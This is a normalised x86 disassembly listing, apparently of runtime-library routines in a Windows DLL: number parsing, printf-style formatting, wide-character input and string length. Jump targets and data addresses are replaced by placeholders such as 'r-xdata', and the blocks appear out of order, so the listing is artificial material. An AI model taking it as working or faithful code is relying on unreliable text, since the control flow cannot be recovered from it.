cmp [ edx ] 0x0
je r-xdata
mov esi [ ebp + 0xc ]
mov ecx [ esi + 0x4 ]
cmp eax ecx
je r-xdata
test [ esi ] 0x2
je r-xdata
add ecx 0x8
push ecx
push edx
call sub_1007fbc0
pop ecx
pop ecx
test eax eax
je r-xdata
mov eax [ ebp + 0x10 ]
mov eax [ eax ]
test al 0x1
je r-xdata
test [ edi ] 0x8
je r-xdata
xor eax eax
jmp r-xdata
test al 0x2
je r-xdata
test [ edi ] 0x1
je r-xdata
pop edi
pop esi
pop ebp
retn
test [ edi ] 0x2
je r-xdata
sub_1000fdf6
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x14 ]
sub esp 0x28
push ebx
push esi
xor esi esi
push edi
cmp eax esi
je r-xdata
mov ebx [ ebp + 0x8 ]
movzx eax [ ebx ]
mov edi ebx
jmp r-xdata
mov [ eax ] esi
push eax
call sub_10002c6e
pop ecx
test eax eax
jne r-xdata
inc edi
movzx eax [ edi ]
mov al [ edi ]
cmp al 0x2d
je r-xdata
mov [ ebp - 0x1 ] al
inc edi
cmp al 0x2b
je r-xdata
mov eax [ ebp + 0xc ]
cmp eax esi
cmp eax 0x1
je r-xdata
mov [ ebp - 0x1 ] 0x2b
jmp r-xdata
xor eax eax
xor edx edx
mov [ eax ] ebx
cmp eax 0x24
jg r-xdata
mov eax [ ebp + 0x10 ]
cmp eax esi
jl r-xdata
mov cl 0x30
cmp eax esi
jle r-xdata
cmp [ edi ] cl
je r-xdata
cmp eax 0x10
jne r-xdata
mov al [ edi + 0x1 ]
cmp al 0x78
je r-xdata
mov [ ebp + 0x10 ] 0xa
jmp r-xdata
mov [ ebp - 0xc ] edi
jmp r-xdata
cmp [ edi ] cl
jne r-xdata
mov [ ebp + 0x10 ] 0x10
cmp al 0x58
je r-xdata
cmp [ edi ] cl
je r-xdata
mov al [ edi + 0x1 ]
cmp al 0x78
je r-xdata
mov [ ebp + 0x10 ] 0x8
jmp r-xdata
inc edi
movsx eax [ edi ]
push [ ebp + 0x10 ]
mov [ ebp - 0x18 ] esi
push eax
mov [ ebp - 0x14 ] esi
mov [ ebp - 0x10 ] edi
mov [ ebp - 0x20 ] esi
mov [ ebp - 0x1c ] esi
mov [ ebp - 0x2 ] 0x0
call sub_1006a3ae
pop ecx
push eax
mov esi r--data
push esi
call sub_1007f310
mov ecx eax
add esp 0xc
test ecx ecx
je r-xdata
add edi 0x2
cmp al 0x58
jne r-xdata
cmp [ ebp - 0xc ] edi
jne r-xdata
mov eax [ ebp + 0x10 ]
cdq
mov [ ebp - 0x28 ] eax
mov [ ebp - 0x24 ] edx
jmp r-xdata
mov ebx [ ebp + 0x10 ]
movsx ecx [ ebx + r--data ]
mov eax edi
sub eax ecx
sub eax [ ebp - 0x10 ]
js r-xdata
mov eax [ ebp + 0xc ]
test eax eax
jmp r-xdata
push [ ebp - 0x14 ]
mov eax [ ebp - 0x18 ]
push [ ebp - 0x18 ]
mov [ ebp - 0x20 ] eax
mov eax [ ebp - 0x14 ]
push [ ebp - 0x24 ]
mov [ ebp - 0x1c ] eax
push [ ebp - 0x28 ]
mov bl cl
mov eax esi
sub bl al
mov [ ebp - 0x2 ] bl
call sub_10082410
push [ ebp + 0x10 ]
mov ecx eax
movsx eax bl
mov [ ebp - 0x8 ] edx
cdq
add ecx eax
mov eax [ ebp - 0x8 ]
adc eax edx
mov [ ebp - 0x14 ] eax
inc edi
movsx eax [ edi ]
push eax
mov [ ebp - 0x18 ] ecx
call sub_1006a3ae
pop ecx
push eax
push esi
call sub_1007f310
mov ecx eax
add esp 0xc
test ecx ecx
jne r-xdata
mov ebx [ ebp + 0x8 ]
cmp [ ebp - 0x1 ] 0x2d
jne r-xdata
test eax eax
jg r-xdata
je r-xdata
mov eax [ ebp + 0xc ]
test eax eax
je r-xdata
mov eax [ ebp - 0x18 ]
mov ecx [ ebp - 0x14 ]
neg eax
adc ecx 0x0
neg ecx
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x14 ] ecx
call sub_1005b670
mov [ eax ] 0x22
mov eax [ ebp + 0x14 ]
test eax eax
je r-xdata
movsx eax [ ebp - 0x2 ]
mov esi [ ebp - 0x18 ]
mov ecx [ ebp - 0x14 ]
cdq
sub esi eax
sbb ecx edx
cmp [ ebp - 0x14 ] ecx
jb r-xdata
mov eax [ ebp - 0x18 ]
mov edx [ ebp - 0x14 ]
jmp r-xdata
mov [ eax ] edi
or [ ebp - 0x18 ] 0xffffffff
or [ ebp - 0x14 ] 0xffffffff
mov [ ebp - 0x1 ] 0x2b
mov [ eax ] 0x1
ja r-xdata
pop edi
pop esi
pop ebx
leave
retn
mov eax ebx
cdq
push edx
push eax
push ecx
push esi
call sub_100845a0
cmp eax [ ebp - 0x20 ]
jne r-xdata
cmp [ ebp - 0x18 ] esi
jb r-xdata
cmp edx [ ebp - 0x1c ]
je r-xdata
sub_10010000
push esi
mov esi ecx
cmp [ esi + 0x8 ] 0x0
jne r-xdata
mov eax [ esi ]
mov edx [ eax ]
call edx
cmp [ esi + 0x84 ] 0x8
lea eax [ esi + 0x70 ]
jb r-xdata
xor eax eax
pop esi
retn
push eax
call [ DeleteFileW@IAT ]
pop esi
retn
mov eax [ eax ]
sub_1001002a
mov edi edi
push ebp
mov ebp esp
sub esp 0x280
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
mov ebx [ ebp + 0xc ]
push esi
mov esi [ ebp + 0x8 ]
xor eax eax
push edi
mov edi [ ebp + 0x14 ]
push [ ebp + 0x10 ]
lea ecx [ ebp - 0x254 ]
mov [ ebp - 0x230 ] esi
mov [ ebp - 0x21c ] edi
mov [ ebp - 0x258 ] eax
mov [ ebp - 0x210 ] eax
mov [ ebp - 0x238 ] eax
mov [ ebp - 0x218 ] eax
mov [ ebp - 0x234 ] eax
mov [ ebp - 0x25c ] eax
mov [ ebp - 0x23c ] eax
call sub_10051cf5
call sub_1005b670
mov [ ebp - 0x264 ] eax
test esi esi
jne r-xdata
test [ esi + 0xc ] 0x40
jne r-xdata
call sub_1005b670
mov [ eax ] 0x16
call sub_1004b131
cmp [ ebp - 0x248 ] 0x0
je r-xdata
xor esi esi
cmp ebx esi
je r-xdata
push esi
call sub_10063a9a
pop ecx
mov edx rw-data
cmp eax 0xffffffff
je r-xdata
or eax 0xffffffff
jmp r-xdata
mov eax [ ebp - 0x24c ]
and [ eax + 0x70 ] 0xfffffffd
mov dl [ ebx ]
mov [ ebp - 0x224 ] esi
mov [ ebp - 0x228 ] esi
mov [ ebp - 0x244 ] esi
mov [ ebp - 0x260 ] esi
mov [ ebp - 0x211 ] dl
test dl dl
je r-xdata
mov ecx edx
cmp eax 0xfffffffe
je r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_10032529
leave
retn
cmp [ ebp - 0x248 ] 0x0
je r-xdata
inc ebx
mov [ ebp - 0x240 ] ebx
cmp [ ebp - 0x224 ] esi
jl r-xdata
cmp eax 0xffffffff
je r-xdata
mov ecx eax
and ecx 0x1f
mov esi eax
sar esi 0x5
shl ecx 0x6
add ecx [ esi * 4 + rw-data ]
jmp r-xdata
mov eax [ ebp - 0x224 ]
mov eax [ ebp - 0x24c ]
and [ eax + 0x70 ] 0xfffffffd
cmp [ ebp - 0x244 ] 0x0
je r-xdata
lea eax [ edx - 0x20 ]
cmp al 0x58
ja r-xdata
mov eax edx
cmp eax 0xfffffffe
je r-xdata
test [ ecx + 0x24 ] 0x7f
jne r-xdata
cmp [ ebp - 0x244 ] 0x7
jne r-xdata
xor eax eax
movsx eax dl
movzx eax [ eax + r--data ]
and eax 0xf
jmp r-xdata
mov ecx eax
and eax 0x1f
sar ecx 0x5
shl eax 0x6
add eax [ ecx * 4 + rw-data ]
jmp r-xdata
push 0x7
pop ecx
cmp eax ecx
ja r-xdata
mov ecx [ ebp - 0x244 ]
imul eax eax 0x9
movzx eax [ eax + ecx + r--data ]
push 0x8
shr eax 0x4
pop esi
mov [ ebp - 0x244 ] eax
cmp eax esi
je r-xdata
test [ eax + 0x24 ] 0x80
jne r-xdata
mov ebx [ ebp - 0x240 ]
mov al [ ebx ]
mov [ ebp - 0x211 ] al
test al al
je r-xdata
jmp [ eax * 4 + jump_table_10010c3e ]
mov edi [ ebp - 0x21c ]
xor esi esi
mov dl al
jmp r-xdata
xor eax eax
or [ ebp - 0x218 ] 0xffffffff
mov [ ebp - 0x274 ] eax
mov [ ebp - 0x25c ] eax
mov [ ebp - 0x238 ] eax
mov [ ebp - 0x234 ] eax
mov [ ebp - 0x210 ] eax
mov [ ebp - 0x23c ] eax
jmp r-xdata
movsx eax dl
sub eax 0x20
je r-xdata
cmp dl 0x2a
jne r-xdata
and [ ebp - 0x218 ] 0x0
jmp r-xdata
cmp dl 0x2a
jne r-xdata
cmp dl 0x49
je r-xdata
and [ ebp - 0x23c ] 0x0
lea eax [ ebp - 0x254 ]
push eax
movzx eax dl
push eax
call sub_1001b8e5
pop ecx
test eax eax
mov al [ ebp - 0x211 ]
pop ecx
je r-xdata
movsx eax dl
cmp eax 0x64
jg r-xdata
or [ ebp - 0x210 ] 0x2
jmp r-xdata
sub eax 0x3
je r-xdata
mov eax [ ebp - 0x238 ]
imul eax eax 0xa
movsx ecx dl
lea eax [ eax + ecx - 0x30 ]
mov [ ebp - 0x238 ] eax
jmp r-xdata
add edi 0x4
mov [ ebp - 0x21c ] edi
mov edi [ edi - 0x4 ]
mov [ ebp - 0x238 ] edi
test edi edi
jns r-xdata
mov eax [ ebp - 0x218 ]
imul eax eax 0xa
movsx ecx dl
lea eax [ eax + ecx - 0x30 ]
mov [ ebp - 0x218 ] eax
jmp r-xdata
add edi 0x4
mov [ ebp - 0x21c ] edi
mov edi [ edi - 0x4 ]
mov [ ebp - 0x218 ] edi
test edi edi
jns r-xdata
mov al [ ebx ]
cmp al 0x36
jne r-xdata
cmp dl 0x68
je r-xdata
mov ecx [ ebp - 0x230 ]
lea esi [ ebp - 0x224 ]
call sub_1008037d
jmp r-xdata
mov ecx [ ebp - 0x230 ]
lea esi [ ebp - 0x224 ]
call sub_1008037d
mov al [ ebx ]
inc ebx
mov [ ebp - 0x240 ] ebx
test al al
je r-xdata
cmp eax 0x70
jg r-xdata
je r-xdata
or [ ebp - 0x210 ] 0x80
jmp r-xdata
sub eax esi
je r-xdata
or [ ebp - 0x210 ] 0x4
neg [ ebp - 0x238 ]
jmp r-xdata
or [ ebp - 0x218 ] 0xffffffff
jmp r-xdata
cmp al 0x33
jne r-xdata
cmp [ ebx + 0x1 ] 0x34
jne r-xdata
or [ ebp - 0x210 ] 0x20
jmp r-xdata
cmp dl 0x6c
je r-xdata
sub eax 0x73
je r-xdata
je r-xdata
or [ ebp - 0x210 ] 0x40
cmp eax 0x53
jg r-xdata
or [ ebp - 0x210 ] 0x1
jmp r-xdata
dec eax
dec eax
je r-xdata
cmp al 0x64
je r-xdata
cmp [ ebx + 0x1 ] 0x32
jne r-xdata
add ebx 0x2
or [ ebp - 0x210 ] 0x8000
mov [ ebp - 0x240 ] ebx
jmp r-xdata
cmp [ ebx ] 0x6c
jne r-xdata
cmp dl 0x77
jne r-xdata
mov ecx [ ebp - 0x218 ]
cmp ecx 0xffffffff
jne r-xdata
dec eax
dec eax
je r-xdata
mov [ ebp - 0x218 ] esi
cmp eax 0x65
jl r-xdata
test ecx 0x1000
jne r-xdata
add edi esi
mov eax [ edi - 0x8 ]
mov edx [ edi - 0x4 ]
jmp r-xdata
sub eax 0x58
je r-xdata
je r-xdata
or [ ebp - 0x210 ] 0x4
jmp r-xdata
sub eax 0x3
jne r-xdata
cmp al 0x69
je r-xdata
add ebx 0x2
and [ ebp - 0x210 ] 0xffff7fff
mov [ ebp - 0x240 ] ebx
jmp r-xdata
or [ ebp - 0x210 ] 0x10
jmp r-xdata
inc ebx
or [ ebp - 0x210 ] 0x1000
mov [ ebp - 0x240 ] ebx
jmp r-xdata
or [ ebp - 0x210 ] 0x800
jmp r-xdata
add edi 0x4
test [ ebp - 0x210 ] 0x810
mov [ ebp - 0x21c ] edi
mov edi [ edi - 0x4 ]
mov [ ebp - 0x220 ] edi
je r-xdata
mov ecx 0x7fffffff
mov [ ebp - 0x228 ] 0xa
sub eax 0x3
jne r-xdata
test [ ebp - 0x210 ] 0x80
mov [ ebp - 0x228 ] 0x10
je r-xdata
cmp [ ebp - 0x25c ] 0x0
jne r-xdata
cmp eax 0x67
jle r-xdata
add edi 0x4
test cl 0x20
je r-xdata
mov [ ebp - 0x21c ] edi
mov [ ebp - 0x258 ] ecx
jmp r-xdata
dec eax
dec eax
je r-xdata
test [ ebp - 0x210 ] 0x830
jne r-xdata
sub eax 0x41
je r-xdata
or [ ebp - 0x210 ] esi
jmp r-xdata
cmp al 0x6f
je r-xdata
test edi edi
jne r-xdata
test edi edi
jne r-xdata
mov edi [ ebp - 0x21c ]
mov [ ebp - 0x258 ] 0x27
mov ecx [ ebp - 0x210 ]
test ecx 0x8000
je r-xdata
mov al [ ebp - 0x258 ]
add al 0x51
mov [ ebp - 0x22c ] 0x30
mov [ ebp - 0x22b ] al
mov [ ebp - 0x234 ] 0x2
jmp r-xdata
cmp [ ebp - 0x260 ] 0x0
je r-xdata
mov ecx [ ebp - 0x210 ]
test cl 0x40
je r-xdata
mov edi [ ebp - 0x21c ]
cmp eax 0x69
je r-xdata
mov eax [ edi - 0x4 ]
test cl 0x40
je r-xdata
mov [ ebp - 0x21c ] edi
test cl 0x40
je r-xdata
test [ ebp - 0x210 ] 0x9000
mov edi edx
mov ebx eax
jne r-xdata
test edx edx
jg r-xdata
mov eax [ edi ]
add edi 0x4
mov [ ebp - 0x21c ] edi
test eax eax
je r-xdata
sub eax ecx
je r-xdata
or [ ebp - 0x210 ] 0x800
add dl 0x20
mov [ ebp - 0x274 ] 0x1
mov [ ebp - 0x211 ] dl
jmp r-xdata
dec eax
dec eax
je r-xdata
cmp al 0x75
je r-xdata
mov eax [ ebp - 0x220 ]
jmp r-xdata
mov eax [ rw-data ]
mov [ ebp - 0x220 ] eax
mov eax [ ebp - 0x220 ]
mov [ ebp - 0x23c ] 0x1
jmp r-xdata
mov eax [ rw-data ]
mov [ ebp - 0x220 ] eax
push [ ebp - 0x260 ]
call sub_1001b2d2
and [ ebp - 0x260 ] 0x0
pop ecx
mov eax [ ebp - 0x238 ]
sub eax [ ebp - 0x228 ]
sub eax [ ebp - 0x234 ]
mov [ ebp - 0x268 ] eax
test cl 0xc
jne r-xdata
test ecx 0x100
je r-xdata
jne r-xdata
mov [ ebp - 0x218 ] 0x6
jmp r-xdata
mov edi [ ebp - 0x21c ]
cmp eax 0x6e
je r-xdata
xor edx edx
cdq
jmp r-xdata
movzx eax [ edi - 0x4 ]
movsx eax [ edi - 0x4 ]
jmp r-xdata
cmp [ ebp - 0x218 ] 0x0
jge r-xdata
xor edi edi
jl r-xdata
mov eax [ rw-data ]
mov [ ebp - 0x220 ] eax
push eax
mov ecx [ eax + 0x4 ]
test ecx ecx
je r-xdata
or [ ebp - 0x210 ] 0x40
cmp [ ebp - 0x218 ] 0x0
lea ebx [ ebp - 0x20c ]
mov eax 0x200
mov [ ebp - 0x220 ] ebx
mov [ ebp - 0x268 ] eax
jge r-xdata
dec eax
dec eax
jne r-xdata
test [ ebp - 0x210 ] 0x830
jne r-xdata
dec eax
dec eax
je r-xdata
cmp al 0x78
je r-xdata
test ecx ecx
jne r-xdata
test ecx ecx
jne r-xdata
push [ ebp - 0x234 ]
mov edi [ ebp - 0x264 ]
mov ebx [ ebp - 0x230 ]
lea eax [ ebp - 0x22c ]
push eax
lea eax [ ebp - 0x224 ]
call sub_100803b0
test [ ebp - 0x210 ] 0x8
pop ecx
pop ecx
je r-xdata
mov edi eax
jmp r-xdata
test cl 0x1
je r-xdata
mov [ ebp - 0x22c ] 0x2d
jmp r-xdata
cmp [ ebp - 0x218 ] eax
jle r-xdata
cmp dl 0x67
jne r-xdata
mov eax [ edi ]
mov esi [ DecodePointer@IAT ]
add edi 0x8
mov [ ebp - 0x280 ] eax
mov eax [ edi - 0x4 ]
mov [ ebp - 0x27c ] eax
lea eax [ ebp - 0x254 ]
push eax
push [ ebp - 0x274 ]
movsx eax dl
push [ ebp - 0x218 ]
mov [ ebp - 0x21c ] edi
push eax
push [ ebp - 0x268 ]
lea eax [ ebp - 0x280 ]
push ebx
push eax
push [ rw-data ]
call esi
call eax
mov edi [ ebp - 0x210 ]
add esp 0x1c
and edi 0x80
je r-xdata
add [ ebp - 0x21c ] 0x4
mov eax [ ebp - 0x21c ]
mov esi [ eax - 0x4 ]
call sub_1006a965
test eax eax
je r-xdata
cmp eax 0x6f
jne r-xdata
test cl 0x40
je r-xdata
cdq
jmp r-xdata
and [ ebp - 0x210 ] 0xfffffff7
mov eax 0x200
cmp [ ebp - 0x218 ] eax
jle r-xdata
mov [ ebp - 0x218 ] 0x1
jmp r-xdata
neg eax
adc edx 0x0
neg edx
or [ ebp - 0x210 ] 0x100
test eax eax
jae r-xdata
mov [ ebp - 0x228 ] eax
test [ ebp - 0x210 ] 0x800
movsx eax [ eax ]
mov [ ebp - 0x220 ] ecx
je r-xdata
mov edi [ ebp - 0x21c ]
add edi 0x4
test [ ebp - 0x210 ] 0x810
mov [ ebp - 0x21c ] edi
je r-xdata
or [ ebp - 0x210 ] 0x800
jmp r-xdata
dec eax
dec eax
jne r-xdata
cmp al 0x58
je r-xdata
dec ecx
cmp [ eax ] 0x0
je r-xdata
sub eax [ ebp - 0x220 ]
dec ecx
cmp [ eax ] 0x0
je r-xdata
sub eax [ ebp - 0x220 ]
sar eax 0x1
jmp r-xdata
cmp [ ebp - 0x23c ] 0x0
mov eax [ ebp - 0x228 ]
je r-xdata
test [ ebp - 0x210 ] 0x4
jne r-xdata
test edi edi
jg r-xdata
test cl 0x2
je r-xdata
mov [ ebp - 0x22c ] 0x2b
jmp r-xdata
mov [ ebp - 0x234 ] 0x1
cmp [ ebp - 0x218 ] 0xa3
jle r-xdata
mov [ ebp - 0x218 ] eax
mov [ ebp - 0x218 ] 0x1
jmp r-xdata
cmp [ ebp - 0x211 ] 0x67
jne r-xdata
cmp [ ebp - 0x218 ] 0x0
jne r-xdata
test [ ebp - 0x210 ] 0x20
je r-xdata
test [ ebp - 0x210 ] 0x80
mov edi [ ebp - 0x21c ]
mov [ ebp - 0x228 ] esi
je r-xdata
mov eax ebx
or eax edi
jne r-xdata
mov [ ebp - 0x218 ] eax
and [ ebp - 0x23c ] 0x0
jmp r-xdata
cdq
sub eax edx
sar eax 0x1
mov [ ebp - 0x23c ] 0x1
jmp r-xdata
mov al [ edi - 0x4 ]
mov [ ebp - 0x20c ] al
mov [ ebp - 0x228 ] 0x1
movzx eax [ edi - 0x4 ]
push eax
push 0x200
lea eax [ ebp - 0x20c ]
push eax
lea eax [ ebp - 0x228 ]
push eax
call sub_10063ad3
add esp 0x10
test eax eax
je r-xdata
and [ ebp - 0x244 ] 0x0
inc eax
add eax 0x2
mov edi [ ebp - 0x264 ]
push eax
push [ ebp - 0x220 ]
lea eax [ ebp - 0x224 ]
call sub_100803b0
pop ecx
pop ecx
test eax eax
jle r-xdata
mov edi [ ebp - 0x268 ]
jmp r-xdata
mov ecx [ ebp - 0x230 ]
lea esi [ ebp - 0x224 ]
mov al 0x20
dec edi
call sub_1008037d
cmp [ ebp - 0x224 ] 0xffffffff
je r-xdata
mov [ ebp - 0x22c ] 0x20
mov esi [ ebp - 0x218 ]
add esi 0x15d
push esi
call sub_1005f1fb
mov dl [ ebp - 0x211 ]
pop ecx
mov [ ebp - 0x260 ] eax
test eax eax
je r-xdata
cmp [ ebx ] 0x2d
jne r-xdata
test edi edi
jne r-xdata
lea eax [ ebp - 0x254 ]
push eax
push ebx
push [ rw-data ]
call esi
call eax
pop ecx
pop ecx
mov eax [ ebp - 0x224 ]
mov [ esi ] eax
mov ax [ ebp - 0x224 ]
mov [ esi ] ax
jmp r-xdata
or [ ebp - 0x210 ] 0x200
jmp r-xdata
lea esi [ ebp - 0xd ]
and [ ebp - 0x234 ] eax
lea eax [ ebp - 0x20c ]
mov [ ebp - 0x220 ] eax
jmp r-xdata
mov [ ebp - 0x25c ] 0x1
jmp r-xdata
test [ ebp - 0x210 ] 0x4
je r-xdata
mov esi [ ebp - 0x220 ]
mov [ ebp - 0x270 ] eax
test edi edi
jg r-xdata
mov [ ebp - 0x218 ] 0xa3
mov [ ebp - 0x220 ] eax
mov [ ebp - 0x268 ] esi
mov ebx eax
jmp r-xdata
push ebx
jmp r-xdata
or [ ebp - 0x210 ] 0x100
inc ebx
mov [ ebp - 0x220 ] ebx
lea eax [ ebp - 0x254 ]
push eax
push ebx
push [ rw-data ]
call esi
call eax
pop ecx
pop ecx
mov [ ebp - 0x25c ] 0x1
jmp r-xdata
mov eax [ ebp - 0x228 ]
cdq
push edx
push eax
push edi
push ebx
call sub_10082370
add ecx 0x30
mov [ ebp - 0x268 ] ebx
mov ebx eax
mov edi edx
cmp ecx 0x39
jle r-xdata
mov eax ebx
or eax edi
je r-xdata
mov edi [ ebp - 0x268 ]
jmp r-xdata
or [ ebp - 0x224 ] 0xffffffff
jmp r-xdata
cmp [ ebp - 0x278 ] eax
je r-xdata
lea esi [ ebp - 0x224 ]
mov ecx ebx
mov al 0x30
dec edi
call sub_1008037d
cmp [ ebp - 0x224 ] 0xffffffff
je r-xdata
call sub_1007fa40
pop ecx
jmp r-xdata
mov [ esi ] cl
dec esi
jmp r-xdata
add ecx [ ebp - 0x258 ]
lea eax [ ebp - 0xd ]
sub eax esi
inc esi
test [ ebp - 0x210 ] 0x200
mov [ ebp - 0x228 ] eax
mov [ ebp - 0x220 ] esi
je r-xdata
test edi edi
jg r-xdata
cmp [ ebp - 0x224 ] 0x0
jl r-xdata
push [ ebp - 0x278 ]
mov edi [ ebp - 0x264 ]
mov ebx [ ebp - 0x230 ]
lea eax [ ebp - 0xc ]
push eax
lea eax [ ebp - 0x224 ]
call sub_100803b0
cmp [ ebp - 0x270 ] 0x0
pop ecx
pop ecx
jne r-xdata
mov eax [ ebp - 0x218 ]
dec [ ebp - 0x218 ]
test eax eax
jg r-xdata
test eax eax
je r-xdata
mov ecx [ ebp - 0x230 ]
lea esi [ ebp - 0x224 ]
mov al 0x20
dec edi
call sub_1008037d
cmp [ ebp - 0x224 ] 0xffffffff
je r-xdata
movzx eax [ esi ]
dec [ ebp - 0x270 ]
push eax
push 0x6
lea eax [ ebp - 0xc ]
push eax
lea eax [ ebp - 0x278 ]
push eax
add esi 0x2
call sub_10063ad3
add esp 0x10
test eax eax
jne r-xdata
jmp r-xdata
dec [ ebp - 0x220 ]
mov ecx [ ebp - 0x220 ]
mov [ ecx ] 0x30
inc eax
jmp r-xdata
mov ecx esi
cmp [ ecx ] 0x30
je r-xdata
sub_10010c5e
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
push esi
mov esi [ ebp + 0xc ]
test [ esi + 0xc ] 0x40
push edi
jne r-xdata
add [ esi + 0x4 ] 0xfffffffe
js r-xdata
push esi
call sub_10063a9a
pop ecx
mov ebx rw-data
cmp eax 0xffffffff
je r-xdata
movzx eax [ ebp + 0x8 ]
push esi
push eax
call sub_1006885c
pop ecx
pop ecx
mov ecx [ esi ]
mov eax [ ebp + 0x8 ]
mov [ ecx ] ax
add [ esi ] 0x2
jmp r-xdata
mov eax ebx
push esi
call sub_10063a9a
pop ecx
cmp eax 0xfffffffe
je r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_10032529
leave
retn
push esi
call sub_10063a9a
pop ecx
cmp eax 0xffffffff
je r-xdata
push esi
call sub_10063a9a
sar eax 0x5
push esi
lea edi [ eax * 4 + rw-data ]
call sub_10063a9a
and eax 0x1f
pop ecx
shl eax 0x6
add eax [ edi ]
pop ecx
jmp r-xdata
mov eax ebx
push esi
call sub_10063a9a
pop ecx
cmp eax 0xfffffffe
je r-xdata
mov al [ eax + 0x24 ]
and al 0x7f
cmp al 0x2
je r-xdata
push esi
call sub_10063a9a
pop ecx
cmp eax 0xffffffff
je r-xdata
push esi
call sub_10063a9a
sar eax 0x5
push esi
lea edi [ eax * 4 + rw-data ]
call sub_10063a9a
and eax 0x1f
pop ecx
shl eax 0x6
add eax [ edi ]
pop ecx
jmp r-xdata
mov eax ebx
push esi
call sub_10063a9a
pop ecx
cmp eax 0xfffffffe
je r-xdata
mov al [ eax + 0x24 ]
and al 0x7f
cmp al 0x1
je r-xdata
push [ ebp + 0x8 ]
lea eax [ ebp - 0xc ]
push 0x5
push eax
lea eax [ ebp - 0x10 ]
push eax
call sub_10063ad3
add esp 0x10
test eax eax
je r-xdata
push esi
call sub_10063a9a
sar eax 0x5
push esi
lea edi [ eax * 4 + rw-data ]
call sub_10063a9a
and eax 0x1f
pop ecx
shl eax 0x6
add eax [ edi ]
pop ecx
jmp r-xdata
xor edi edi
cmp [ ebp - 0x10 ] edi
jle r-xdata
mov eax 0xffff
jmp r-xdata
test [ eax + 0x4 ] 0x80
je r-xdata
mov ax [ ebp + 0x8 ]
jmp r-xdata
dec [ esi + 0x4 ]
js r-xdata
movsx eax [ ebp + edi - 0xc ]
push esi
push eax
call sub_1000842a
pop ecx
pop ecx
mov eax [ esi ]
mov cl [ ebp + edi - 0xc ]
mov [ eax ] cl
mov ecx [ esi ]
movzx eax [ ecx ]
inc ecx
mov [ esi ] ecx
jmp r-xdata
inc edi
cmp edi [ ebp - 0x10 ]
jl r-xdata
cmp eax 0xffffffff
je r-xdata
sub_10010de5
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov cx [ eax ]
add eax 0x2
test cx cx
jne r-xdata
sub eax [ ebp + 0x8 ]
sar eax 0x1
dec eax
pop ebp
retn
sub_10010e00
push ebp
mov ebp esp
sub esp 0x70
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
mov edx [ eax ]
mov edx [ edx + 0x30 ]
push ebx
mov [ ebp - 0x70 ] ecx
lea ecx [ ebp - 0x60 ]
push ecx
xor ebx ebx
push eax
mov [ ebp - 0x60 ] ebx
call edx
test eax eax
jns r-xdata
mov eax [ ebp - 0x60 ]
lea edx [ ebp - 0x6c ]
mov [ ebp - 0x6c ] ebx
mov ecx [ eax ]
push edx
push eax
mov eax [ ecx + 0x20 ]
call eax
mov eax [ ebp - 0x6c ]
cmp eax ebx
jne r-xdata
lea eax [ ebx + 0x1 ]
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10032529
mov esp ebp
pop ebp
retn 0x4
push edi
xor edi edi
cmp eax ebx
jle r-xdata
lea edx [ ebp - 0x34 ]
mov eax 0xbb
call sub_1002f620
mov eax 0x2
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10032529
mov esp ebp
pop ebp
retn 0x4
mov eax [ ebp - 0x60 ]
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
mov ecx [ ebp - 0x4 ]
pop edi
xor ecx ebp
xor eax eax
pop ebx
call sub_10032529
mov esp ebp
pop ebp
retn 0x4
push esi
lea edx [ ebp - 0x38 ]
mov eax 0x46
lea edx [ ebp - 0x68 ]
push edx
mov [ ebp - 0x68 ] ebx
call sub_10070310
test eax eax
je r-xdata
inc edi
cmp edi [ ebp - 0x6c ]
jl r-xdata
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
mov esi [ ebp - 0x68 ]
mov eax [ ebp - 0x70 ]
push esi
add eax 0x54
call sub_10001ba0
cmp esi ebx
je r-xdata
mov ecx [ ebp - 0x68 ]
cmp ecx ebx
je r-xdata
mov eax [ ebp - 0x60 ]
lea edx [ ebp - 0x64 ]
push edx
mov [ ebp - 0x64 ] ebx
mov ecx [ eax ]
push edi
push eax
mov eax [ ecx + 0x1c ]
call eax
mov ecx [ ebp - 0x64 ]
cmp ecx ebx
je r-xdata
pop esi
mov eax [ ebp - 0x64 ]
cmp eax ebx
je r-xdata
mov eax [ esi ]
mov edx [ eax ]
push 0x1
mov ecx esi
call edx
jmp r-xdata
lea edx [ ebp - 0x5c ]
mov eax 0x6c
jmp r-xdata
mov eax [ ecx ]
mov edx [ eax ]
push 0x1
call edx
call sub_1002f620
sub_10010f30
push 0x14
mov eax sub_10085df6
call sub_10026266
push 0x0
lea ecx [ ebp - 0x14 ]
call sub_1000c927
mov esi [ rw-data ]
and [ ebp - 0x4 ] 0x0
mov ecx rw-data
mov [ ebp - 0x10 ] esi
call sub_1006ef60
mov ecx [ ebp + 0x8 ]
push eax
call sub_1005eec0
mov edi eax
test edi edi
jne r-xdata
or [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x14 ]
call sub_10003c9c
mov eax edi
call sub_10008d33
retn
test esi esi
je r-xdata
push [ ebp + 0x8 ]
lea eax [ ebp - 0x10 ]
push eax
call sub_1000a15c
pop ecx
pop ecx
cmp eax 0xffffffff
jne r-xdata
mov edi esi
jmp r-xdata
mov edi [ ebp - 0x10 ]
mov ecx edi
mov [ rw-data ] edi
call sub_10042890
push edi
call sub_10008715
pop ecx
push r--data
lea ecx [ ebp - 0x20 ]
call sub_100661c2
push r--data
lea eax [ ebp - 0x20 ]
push eax
call sub_10055e2a
sub_10010fd0
push ebp
mov ebp esp
sub esp 0x50
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ esi + 0x8 ]
mov ecx [ eax ]
lea edx [ ebp - 0x48 ]
push edx
lea edx [ ebp - 0x4c ]
push edx
push eax
